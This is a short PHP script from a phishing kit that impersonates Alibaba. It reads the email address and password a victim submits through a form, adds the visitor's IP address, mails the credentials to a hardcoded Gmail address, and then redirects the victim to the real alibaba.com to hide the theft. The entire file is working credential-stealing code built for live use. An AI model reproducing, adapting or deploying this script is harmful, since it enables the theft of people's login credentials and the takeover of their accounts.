<?php
$ip = getenv("REMOTE_ADDR");
$message .= "---------------------ALiBaBa-------------------------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------------- By Shaun ---------------------\n";

$send = "wj11447700@gmail.com";

$subject = "ALiBaBa";
$headers = "From: ALiBaBa";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://www.alibaba.com/");
	  

?>